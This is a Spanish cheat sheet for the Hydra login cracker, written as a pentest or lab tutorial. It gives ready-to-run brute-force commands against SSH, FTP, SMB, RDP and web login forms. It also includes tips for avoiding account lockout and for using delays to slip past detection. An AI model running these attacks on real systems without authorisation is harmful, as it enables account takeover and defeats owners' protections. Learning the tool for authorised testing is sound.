# Hydra Cheat Sheet & Guía Detallada

Guía completa y explicada paso a paso para la realización de ataques de fuerza bruta y diccionarios de credenciales en red mediante **Hydra**.

---

## 1. ¿Qué es Hydra y cómo funciona?

**Hydra** es un craqueador de logins en red ultra rápido y paralelizado. Permite probar combinaciones de usuarios y contraseñas contra docenas de protocolos de comunicación (SSH, FTP, SMB, RDP, HTTP, MySQL, etc.).

### Estructura de Comando Genérica:
```bash
hydra [OPCIONES] <IP_OBJETIVO> <PROTOCOLO/SERVICIO> [PARÁMETROS_DEL_SERVICIO]
```

---

## 2. Explicación Detallada de Parámetros y Flags

| Flag / Opción | Descripción Explicada | Ejemplo de uso |
| :--- | :--- | :--- |
| `-l <USUARIO>` | Especifica un **único nombre de usuario** conocido. | `-l admin` |
| `-L <ARCHIVO>` | Ruta a un **diccionario de usuarios** (un usuario por línea). | `-L /usr/share/seclists/Usernames/top-usernames.txt` |
| `-p <PASSWORD>` | Especifica una **única contraseña** conocida. | `-p Password123` |
| `-P <ARCHIVO>` | Ruta a un **diccionario de contraseñas**. | `-P /usr/share/wordlists/rockyou.txt` |
| `-C <ARCHIVO>` | Ruta a un archivo tipo **Combo** en formato `usuario:contraseña` por línea. | `-C combos.txt` |
| `-t <HILOS>` | Número de **conexiones simultáneas/paralelas** (por defecto 16). En SSH/RDP bajar a 4-8. | `-t 4` |
| `-s <PUERTO>` | Especifica el **puerto** si el servicio corre en un puerto no estándar. | `-s 2222` |
| `-f` | **Detener el ataque inmediatamente** al encontrar la primera credencial válida. | `-f` |
| `-F` | Detener el ataque para **todos los hosts** al encontrar la primera credencial válida. | `-F` |
| `-v` / `-V` | Modo **verboso**. `-v` muestra info útil; `-V` muestra cada intento de usuario:contraseña. | `-V` |
| `-u` | **Bucle por usuario**: prueba 1 contraseña contra todos los usuarios antes de cambiar de contraseña. Evita bloqueos. | `-u` |
| `-R` | **Reanudar** una sesión de Hydra interrumpida previa usando el archivo `hydra.restore`. | `hydra -R` |
| `-M <ARCHIVO>` | Lista de **múltiples IPs objetivo** para atacar en lote. | `-M ips_targets.txt` |

---

## 3. Guía Paso a Paso y Ejemplos por Servicio

### 3.1. Fuerza Bruta en SSH (Puerto 22)
> [!WARNING]
> SSH suele aplicar rate-limiting o banear IPs si se usan muchos hilos. Mantén el parámetro `-t` entre 4 y 8.

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 -f 10.10.10.50 ssh
```
* **Explicación línea por línea**:
  * `-l root`: Probar únicamente la cuenta de usuario `root`.
  * `-P /usr/.../rockyou.txt`: Usar la lista de contraseñas `rockyou.txt`.
  * `-t 4`: Usar solo 4 hilos simultáneos para no colapsar el servicio SSH.
  * `-f`: Detener la ejecución tan pronto se descubra la contraseña correcta de `root`.
  * `10.10.10.50`: Dirección IP del servidor SSH.
  * `ssh`: Nombre del servicio/protocolo objetivo.

---

### 3.2. Fuerza Bruta en FTP (Puerto 21)
FTP es un protocolo rápido sin límite estricto de hilos por defecto.

```bash
hydra -L usuarios.txt -P passwords.txt -t 16 -f 10.10.10.50 ftp
```
* **Explicación**:
  * `-L usuarios.txt`: Probará cada usuario de la lista contra cada contraseña de `passwords.txt`.
  * `-t 16`: Utiliza 16 hilos en paralelo para acelerar el escaneo.

---

### 3.3. Fuerza Bruta en SMB (Puerto 445 - Windows / Samba)
Útil en entornos Active Directory o servidores de archivos independientes.

```bash
hydra -l Administrator -P rockyou.txt -t 4 -f 10.10.10.50 smb
```
* **Explicación**: Prueba la cuenta `Administrator` en el servicio SMB. Mantener `-t 4` para evitar el bloqueo de cuentas en dominios Windows (Account Lockout Policy).

---

### 3.4. Fuerza Bruta en RDP (Puerto 3389 - Escritorio Remoto Windows)
```bash
hydra -l Administrator -P rockyou.txt -t 4 -V 10.10.10.50 rdp
```
* **Explicación**: El parámetro `-V` (mayúscula) mostrará en pantalla cada intento en tiempo real, útil para monitorear si RDP responde adecuadamente.

---

### 3.5. Autenticación Web HTTP Basic / HTTP GET
Para webs que muestran una ventana emergente nativa pidiendo usuario y contraseña (`401 Unauthorized`).

```bash
hydra -l admin -P rockyou.txt -s 8080 10.10.10.50 http-get /admin/
```
* **Explicación**:
  * `-s 8080`: Especifica que la web no está en el puerto 80 sino en el 8080.
  * `http-get`: Método de autenticación HTTP Basic.
  * `/admin/`: Ruta protegida del sitio web.

---

### 3.6. Formularios Web HTTP POST (`http-post-form`)
Usado en páginas web convencionales con formularios HTML `<form method="POST">`.

#### Sintaxis de `http-post-form`:
```bash
"RUTA_FORMULARIO:PARAMETROS_POST:CADENA_ERROR"
```

#### Ejemplo Práctico:
Supongamos que al inspeccionar el formulario de login con `F12` (DevTools) ves:
* URL del formulario: `/login.php`
* Campo de usuario: `username`
* Campo de contraseña: `password`
* Mensaje que sale cuando fallas: `Invalid credentials`

El comando exacto es:
```bash
hydra -l admin -P rockyou.txt 10.10.10.50 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```
* **Explicación**:
  * `/login.php`: La ruta POST donde la web envía los datos.
  * `username=^USER^&password=^PASS^`: `^USER^` se reemplaza por el usuario e `^PASS^` por la contraseña de la lista.
  * `:Invalid credentials`: Es el mensaje de error que Hydra busca en la respuesta web para saber si el intento **falló**. Si ese texto NO aparece en la respuesta, Hydra asume que la contraseña fue **correcta**.

---

## 4. Estrategias Anti-Bloqueo de Cuentas (Lockout Avoidance)

1. **Uso del flag `-u`**:
   Por defecto Hydra prueba 1 usuario contra 1000 contraseñas (esto bloquea la cuenta inmediatamente si hay política de bloqueo a 5 intentos). Con `-u`, Hydra prueba 1 contraseña contra todos los usuarios, luego espera y pasa a la siguiente contraseña.

2. **Añadir delays entre intentos**:
   ```bash
   hydra -l admin -P passwords.txt -W 3 10.10.10.50 ssh
   ```
   * `-W 3`: Espera 3 segundos entre cada intento para burlar sistemas de detección.

---

## 5. Reanudación de Sesiones

Si la ejecución de Hydra se interrumpe (Ctrl+C o desconexión), se genera un archivo `hydra.restore` en el directorio actual. Para reanudar el ataque exactamente desde la última credencial probada:

```bash
hydra -R
```
